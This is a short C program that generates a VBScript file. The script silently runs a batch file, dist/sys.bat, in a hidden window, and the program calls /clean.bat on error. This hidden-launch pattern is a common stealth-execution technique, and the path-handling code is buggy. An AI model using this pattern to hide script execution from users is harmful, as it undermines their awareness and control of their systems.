#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <ctype.h>

char cwd[100];

void getCD()
{
    if (getcwd(cwd, sizeof(cwd)) == NULL)
    {
        system("/clean.bat");
        exit(0);
    }

    int i;
    for (i = 0; cwd[i]; i++)
        if (cwd[i] != ':' && cwd[i] != '.' && !isalpha(cwd[i]))
            cwd[i] = '/';
}

void setFile(char *name)
{
    FILE *file;
    file = fopen(name, "w");
    fputs("Set WshShell = CreateObject(", file);
    fputc('"', file);
    fputs("WScript.Shell", file);
    fputc('"', file);
    fputc(')', file);
    fputc('\n', file);
    fputs("WshShell.Run chr(34) & ", file);
    fputc('"', file);
    getCD();
    fputs(cwd, file);
    fputs("/dist/sys.bat", file);
    fputc('"', file);
    fputs(" & Chr(34), 0\n", file);
    fputs("Set WshShell = Nothing", file);
    fclose(file);
}

int main()
{
    int i = 0;
    setFile("process.vbs");
    return 0;
}